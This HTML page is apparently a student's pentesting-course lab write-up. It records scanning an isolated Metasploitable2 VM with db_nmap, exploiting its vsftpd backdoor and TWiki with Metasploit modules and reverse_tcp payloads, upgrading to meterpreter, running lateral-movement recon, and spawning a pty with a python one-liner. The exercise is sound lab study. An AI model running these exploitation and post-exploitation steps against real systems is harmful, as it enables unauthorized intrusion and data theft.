<!DOCTYPE html>
<html lang="en">
    <head><script src="/tuukkaani-blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=tuukkaani-blog/livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content=" a) Checking kali&rsquo;s and metasploitable2&rsquo;s connections To check the connections of the two machines, I ping 8.8.8.8 and ping terokarvinen.com. Neither one got callbacks.
I acquired both IPs by using ip a and then ping on each of the addresses. The pings were successful.
b) Opening up msfconsole Msfconsole can be opened by using sudo msfconsole.
" />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/tuukkaani-blog/pentesting-course/h2/" />


    <title>
        
            H2 - Nmap and metasploit :: tuukkaani-blog 
        
    </title>





  <link rel="stylesheet" href="/tuukkaani-blog/main.min.2729760c629597024c5de34b40ea9f372f2b5a2a192dcdca537b7ddfa483eab8.css" integrity="sha256-Jyl2DGKVlwJMXeNLQOqfNy8rWioZLc3KU3t936SD6rg=" crossorigin="anonymous">





    <link rel="apple-touch-icon" sizes="180x180" href="/tuukkaani-blog/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/tuukkaani-blog/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/tuukkaani-blog/favicon-16x16.png">
    <link rel="manifest" href="/tuukkaani-blog/site.webmanifest">
    <link rel="mask-icon" href="/tuukkaani-blog/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/tuukkaani-blog/favicon.ico">
    <meta name="msapplication-TileColor" content="">



  <meta itemprop="name" content="H2 - Nmap and metasploit">
  <meta itemprop="description" content="a) Checking kali’s and metasploitable2’s connections To check the connections of the two machines, I ping 8.8.8.8 and ping terokarvinen.com. Neither one got callbacks.
I acquired both IPs by using ip a and then ping on each of the addresses. The pings were successful.
b) Opening up msfconsole Msfconsole can be opened by using sudo msfconsole.">
  <meta itemprop="datePublished" content="2025-09-01T00:00:00+00:00">
  <meta itemprop="dateModified" content="2025-09-01T00:00:00+00:00">
  <meta itemprop="wordCount" content="1261">
  <meta itemprop="keywords" content="Pentesting-Course">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="H2 - Nmap and metasploit">
  <meta name="twitter:description" content="a) Checking kali’s and metasploitable2’s connections To check the connections of the two machines, I ping 8.8.8.8 and ping terokarvinen.com. Neither one got callbacks.
I acquired both IPs by using ip a and then ping on each of the addresses. The pings were successful.
b) Opening up msfconsole Msfconsole can be opened by using sudo msfconsole.">





    <meta property="article:section" content="pentesting-course" />



    <meta property="article:published_time" content="2025-09-01 00:00:00 &#43;0000 UTC" />












    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/tuukkaani-blog/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text ">
                Hello there!</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#00ffcc;
                   animation-duration:1.5s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/tuukkaani-blog/">Home</a></li><li><a href="/tuukkaani-blog/pentesting-course/">Pentesting Course</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://localhost:1313/tuukkaani-blog/pentesting-course/h2/">H2 - Nmap and metasploit</a></h2>

            
            
            

            <div class="post-content">
                <hr>
<h3 id="a-checking-kalis-and-metasploitable2s-connections">a) Checking kali&rsquo;s and metasploitable2&rsquo;s connections</h3>
<p>To check the connections of the two machines, I <code>ping 8.8.8.8</code> and <code>ping terokarvinen.com</code>. Neither one got callbacks.</p>
<p><img src="/tuukkaani-blog/img/h2/kali_offline.png" alt="Kali disconnected"></p>
<p><img src="img/h2/ms_offline.png" alt="Metasploitable2 disconnected"></p>
<p>I acquired both IPs by using <code>ip a</code> and then <code>ping</code> on each of the addresses. The pings were successful.</p>
<p><img src="/tuukkaani-blog/img/h2/kali_ipa.png" alt="kali&rsquo;s IP"></p>
<p><img src="/tuukkaani-blog/img/h2/ms_ipa.png" alt="metasploitable&rsquo;s IP"></p>
<p><img src="/tuukkaani-blog/img/h2/kali_to_ms.png" alt="Kali to ms"></p>
<p><img src="/tuukkaani-blog/img/h2/ms_to_kali.png" alt="Ms to kali"></p>
<hr>
<h3 id="b-opening-up-msfconsole">b) Opening up msfconsole</h3>
<p>Msfconsole can be opened by using <code>sudo msfconsole</code>.</p>
<p><img src="/tuukkaani-blog/img/h2/msfconsole.png" alt="Msfconsole"></p>
<hr>
<h3 id="c-scanning-metasploitable2-using-db_nmap">c) Scanning metasploitable2 using db_nmap</h3>
<p>I tried <code>db_nmap -sn</code> and failed to connect to the database.</p>
<p><img src="/tuukkaani-blog/img/h2/no_database.png" alt="Database not connected"></p>
<p>This happened due to me forgetting to start the postgresql service with <code>sudo systemctl start postgresql</code> and initializing the database with <code>sudo msfdb init</code>. I exited the msfconsole, ran the aforementioned commands and tried <code>sudo msfconsole</code> again, after which I could <code>db_nmap -sn</code> successfully.</p>
<p><img src="/tuukkaani-blog/img/h2/db_nmap.png" alt="Successful db_nmap"></p>
<p>Lastly I navigated to the Metasploitable2&rsquo;s front page using a browser.</p>
<p><img src="/tuukkaani-blog/img/h2/frontpage.png" alt="Metapsloitable2&rsquo;s front page"></p>
<hr>
<h3 id="d-extensive-port-scanning-and-saving-the-results">d) Extensive port scanning and saving the results</h3>
<p>First I did a more extensive scan using <code>db_nmap -T -A -p1-65535 -n 192.168.110.216</code>. The scanned services can be viewed by using the <code>services</code> command.</p>
<p><img src="/tuukkaani-blog/img/h2/services.png" alt="Services"></p>
<p>Then I repeated the scan, but this time with a couple new flags <code>nmap -T -A -p1-65535 -n -oA foo 192.168.110.216</code>. After which three output files could be found in the home directory.</p>
<p><img src="/tuukkaani-blog/img/h2/foo_files.png" alt="Foo files"></p>
<hr>
<h3 id="e-checking-out-the-db-functionality">e) Checking out the DB functionality</h3>
<p>I checked <code>hosts --help</code> and <code>services --help</code>. They both have some similar flags for filtering and searching, notably <code>-S</code> for searching by a given string and <code>-c</code> for showing only specified columns.</p>
<p>Here are the outputs from <code>services -S vsftpd</code> and <code>services -c port,state</code>.</p>
<p><img src="/tuukkaani-blog/img/h2/services_s.png" alt="services -S results"></p>
<p><img src="/tuukkaani-blog/img/h2/services_c.png" alt="services -c results"></p>
<hr>
<h3 id="f-comparing-the-file-output-and-database-output-pros-and-cons">f) Comparing the file output and database output pros and cons</h3>
<h4 id="nmap--oa-foo-files">nmap -oA foo files</h4>
<p>Using nmap with <code>-oA foo</code> flag made three new files with .nmap .gnmap and .xml file extensions. By using <code>cat foo.nmap</code> the output is pretty identical to the nmap&rsquo;s usual .</p>
<p><img src="/tuukkaani-blog/img/h2/foo_snippet.png" alt="Cat foo.nmap"></p>
<p>Next up we got the .gnmap file. Output of the file seems to be not as readable as the .nmap file.</p>
<p><img src="/tuukkaani-blog/img/h2/foo_snippet_2.png" alt="Cat foo.gnmap"></p>
<p>I assume this file is supposed to be used with some sort of parsing tool to make it more useful. The same assumption can be made of the .xml file, which could be given to an external program to parse or log into a larger dataset.</p>
<h4 id="db_nmap">db_nmap</h4>
<p>The <code>db_nmap</code> output is easily readable and can be searched and ordered quite conveniently. It has all the most relevant information in nice columns. For a quick peek inside the terminal window, it is quite nice.</p>
<p><img src="/tuukkaani-blog/img/h2/services_s.png" alt="services -S results"></p>
<h4 id="why-use-one-over-the-other">Why use one over the other?</h4>
<p>Even though I think the <code>db_nmap</code> output is pretty and convenient for a quick reminder, I do find the files to have their strengths as well. They can easily be used alongside tools like grep and awk to parse through. You can also have just the plain output file open on a separate window and add notes if necessary. I find both useful, but personally I like having independent files to work with&hellip; Or writing things down in a notebook.</p>
<hr>
<h3 id="g-exploiting-the-target-machines-vsftpd-service">g) Exploiting the target machine&rsquo;s vsftpd service</h3>
<p>First I used msfconsole&rsquo;s <code>search vsftpd</code> function to search for modules matching the service I am targeting. I get two options:</p>
<p><img src="/tuukkaani-blog/img/h2/vsftpd_search.png" alt="Vsftpd related modules"></p>
<p>a DoS related module and a backdoor. I used the backdoor module by typing <code>use 1</code>.</p>
<p><img src="/tuukkaani-blog/img/h2/use_module.png" alt="Use module 1"></p>
<p>The msfconsole defaulted to cmd/unix/interact payload which I will use. Next I need to setup the target address by typing <code>set RHOST 192.168.110.216</code>. Lastly, I ran the <code>exploit</code> command.</p>
<p><img src="/tuukkaani-blog/img/h2/inside_ms.png" alt="using ls inside metasploitable2"></p>
<p>The exploit ran successfully and I got inside the target machine and have a usable session.</p>
<hr>
<h3 id="h-upgrading-the-session-to-meterpreter">h) Upgrading the session to meterpreter</h3>
<p>Now, I used CTRL+z to background the session and return to the msfconsole.
Using <code>sessions</code> I can see I have an active session: session 1.</p>
<p><img src="/tuukkaani-blog/img/h2/sessions.png" alt="Sessions"></p>
<p>Next I check the usage page for sessions by typing  <code>sessions --help</code>. It has a -u, &ndash;upgrade flag that can be used to upgrade a shell to a meterpreter session. I&rsquo;ll use that to upgrade the session <code>sessions -u 1</code> and check the sessions again.</p>
<p><img src="/tuukkaani-blog/img/h2/meterpreter_session.png" alt="Meterpreter session"></p>
<p>After which I can use the newly created meterpreter session with <code>sessions 2</code>.</p>
<p><img src="/tuukkaani-blog/img/h2/meterpreter.png" alt="Meterpreter"></p>
<hr>
<h3 id="i-looking-for-information-on-possible-lateral-movements">i) Looking for information on possible lateral movements</h3>
<p>Inside the target machine I can use the new meterpreter session to run <code>netstat</code> to see any network connections the target machine has. In this case, it only finds things relating to the target machine and our Kali machine.</p>
<p><img src="/tuukkaani-blog/img/h2/netstat.png" alt="Netstat"></p>
<p>Next I use <code>arp</code> to check the ARP cache for recent connections to the machine. The sole connection right now is the Kali machine, but it could be other machines in the target&rsquo;s network.</p>
<p><img src="/tuukkaani-blog/img/h2/arp.png" alt="ARP"></p>
<hr>
<h3 id="j-checking-other-possible-avenues-of-attack-on-the-target-machine">j) Checking other possible avenues of attack on the target machine</h3>
<p>I CTRL+z the meterpreter session for now and return to the msfconsole. I use <code>services</code> and check which services I&rsquo;ll try first. After some thinking I decide to go check the website and see what we have. I go through all the links listed and see few login pages and other interesting stuff. I decide to start with the first link TWiki.</p>
<h4 id="twiki">TWiki</h4>
<p>After opening twiki I am greeted with the following page:</p>
<p><img src="/tuukkaani-blog/img/h2/twiki.png" alt="Twiki front page"></p>
<p>There is a readme file which could be useful. I decide to take a quick look, maybe it has something interesting inside. Surely enough, we can find the version the server is running:</p>
<p><img src="/tuukkaani-blog/img/h2/twiki_version.png" alt="Twiki readme"></p>
<p>Next up, I use msfconsole&rsquo;s <code>search twiki</code> to see if there are anything that we can use for seemingly very out of date service. We get few hits:</p>
<p><img src="/tuukkaani-blog/img/h2/twiki_exploits.png" alt="Twiki exploits"></p>
<p>I decide to start testing them out. Firstly the one from 2004 <em>unix/webapp/twiki_search</em>. After trying few of the payloads, I couldn&rsquo;t get any established connection back home.</p>
<p>Next I tried the exploit from 2005 <em>unix/webapp/twiki_history</em>. Once again I had to try couple of times, but I got a successful connection with <code>set payload cmd/unix/php/meterpreter/reverse_tcp</code>. I also had some success with <code>set payload cmd/unix/reverse</code> and then upgraded the session to meterpreter with <code>sessions -u 'session id'</code>.</p>
<p><img src="/tuukkaani-blog/img/h2/twiki_win.png" alt="Twiki win"></p>
<hr>
<h3 id="k-testing-out-meterpreters-functionality">k) Testing out meterpreter&rsquo;s functionality</h3>
<p>With the newly established connection to the target machine, I think it is appropriate to test some of the functionality it brings. Just typing <code>help</code> gives us some commands to use.</p>
<p><img src="/tuukkaani-blog/img/h2/meterpreter_help.png" alt="Meterpreter help"></p>
<p>The usual suspects are available to use such as <code>cat cd cp ls</code> and so on.
There are also some interesting ones like <code>download</code> and <code>upload</code>. For getting files out of the system like ssh keys or uploading malicious files.</p>
<hr>
<h3 id="l-saving-the-shell-session-to-a-text-file">l) Saving the shell-session to a text file</h3>
<p>I open up a second terminal window and use the given command <code>script -fa log001.txt</code>.</p>
<p><img src="/tuukkaani-blog/img/h2/script_ok.png" alt="Script ok"></p>
<p>Then I type few test commands and <code>exit</code> the script. I <code>cat</code> the new log file and it outputs the shell one to one.</p>
<p><img src="/tuukkaani-blog/img/h2/benstiller.png" alt="Ben Stiller"></p>
<hr>
<h3 id="opt-m-getting-a-tty-on-the-target-machine">OPT m.) Getting a tty on the target machine</h3>
<p>I am currently connected to the target machine and a dumb shell.
Firstly we can check if python is installed on the system with <code>python -V</code></p>
<p><img src="/tuukkaani-blog/img/h2/python_version.png" alt="Python version"></p>
<p>We can use that to spawn a pseudo terminal by typing <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code>. The pseudo terminal still lacks functionality though like up and down arrows etc. <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#tldr-cheatsheet">(Ropnop 2017.)</a></p>
<p><img src="/tuukkaani-blog/img/h2/nano.png" alt="Nano opened"></p>
<p><em>Nano can be opened just fine.</em></p>
<hr>
<h3 id="x-quick-notes-on-reading-material">x) Quick notes on reading material</h3>
<p>Jaswal goes over a example scenario where we can familiarize the basic tools metasploit offers. In this example we go from doing recon all the way to post exploit. Exploiting a old windows machine using the EternalBlue exploits.
The chapter gives a good overview of the workflow one can start getting familiar to when using metasploit.</p>
<p><a href="https://learning.oreilly.com/library/view/mastering-metasploit/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-31">(Jaswal 2020.)</a></p>
<hr>
<h3 id="sources">Sources</h3>
<p>All the assignments this page is based on can be found at <a href="https://terokarvinen.com/tunkeutumistestaus/">Tero Karvinen</a></p>
<p>Ropnop 2017. <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#tldr-cheatsheet">Upgrading simple shells to fully interactive TTYs</a></p>
<p>Jaswal 2020. <a href="https://learning.oreilly.com/library/view/mastering-metasploit/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-31">Mastering Metasploit 4th edition. Chapter 1. Approaching A Penetration Test Using Metasploit. Conducting a penetration test with metasploit.</a></p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="http://localhost:1313/tuukkaani-blog/categories/pentesting-course/">pentesting-course</a></span>
        
    </p>

  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/tuukkaani-blog/bundle.min.ad54ad97364f77ede35def9096b162bb1f0b3973aa50b080f5e82fa147f6882e2a7200d7535adbf9b51bebf939f1c1ca9bbe6be87530092aca720eac4a226fda.js" integrity="sha512-rVStlzZPd&#43;3jXe&#43;QlrFiux8LOXOqULCA9egvoUf2iC4qcgDXU1rb&#43;bUb6/k58cHKm75r6HUwCSrKcg6sSiJv2g=="></script>




    </body>
</html>
